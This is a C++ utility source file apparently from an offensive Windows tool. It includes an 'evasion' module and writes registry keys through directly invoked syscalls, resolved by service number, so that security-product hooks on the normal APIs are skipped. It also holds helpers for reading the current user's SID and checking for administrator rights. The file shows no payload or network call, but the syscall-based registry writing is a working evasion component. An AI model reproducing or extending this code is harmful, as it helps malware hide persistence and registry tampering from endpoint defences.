#include "Shared.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include <sddl.h>
#include <vector>
#include <cstdio>
#include <sstream>

namespace utils {

namespace Shared {
    std::string ToHex(unsigned int value) {
        char buf[32];
        std::snprintf(buf, sizeof(buf), "%08X", value);
        return std::string(buf);
    }

    LONG NtCreateKeyRelative(HANDLE hRoot, const std::wstring& relativePath, PHANDLE hTarget) {
        auto& resolver = evasion::SyscallResolver::GetInstance();
        DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
        DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

        if (ntCreateKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return (LONG)0xC0000001;

        std::wstringstream ss(relativePath);
        std::wstring segment;
        HANDLE hParent = hRoot;
        HANDLE hNew = NULL;
        NTSTATUS status = 0;

        while (std::getline(ss, segment, L'\\')) {
            if (segment.empty()) continue;

            UNICODE_STRING uSegment;
            uSegment.Buffer = (PWSTR)segment.c_str();
            uSegment.Length = (USHORT)(segment.length() * sizeof(wchar_t));
            uSegment.MaximumLength = uSegment.Length + sizeof(wchar_t);

            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &uSegment, OBJ_CASE_INSENSITIVE, hParent, NULL);

            ULONG disp = 0;
            status = InternalDoSyscall(ntCreateKeySsn, &hNew, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, 0, NULL, 0, &disp, NULL, NULL, NULL, NULL);

            // Close intermediate handle, but not the initial hRoot
            if (hParent != hRoot && hParent != NULL) {
                InternalDoSyscall(ntCloseSsn, hParent, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            }

            if (!NT_SUCCESS(status)) return (LONG)status;
            hParent = hNew;
        }

        *hTarget = hParent;
        return (LONG)status;
    }
}

std::string ws2s(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

std::wstring s2ws(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring strTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &strTo[0], size_needed);
    return strTo;
}

std::wstring GetCurrentUserSid() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return L"";

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (dwSize == 0) {
        CloseHandle(hToken);
        return L"";
    }

    std::vector<BYTE> buffer(dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)buffer.data();

    std::wstring sidStr = L"";
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        LPWSTR pSid = NULL;
        if (ConvertSidToStringSidW(pTokenUser->User.Sid, &pSid)) {
            sidStr = pSid;
            LocalFree(pSid);
        }
    }
    CloseHandle(hToken);
    return sidStr;
}

bool IsAdmin() {
    BOOL bIsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &bIsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return bIsAdmin == TRUE;
}

} // namespace utils
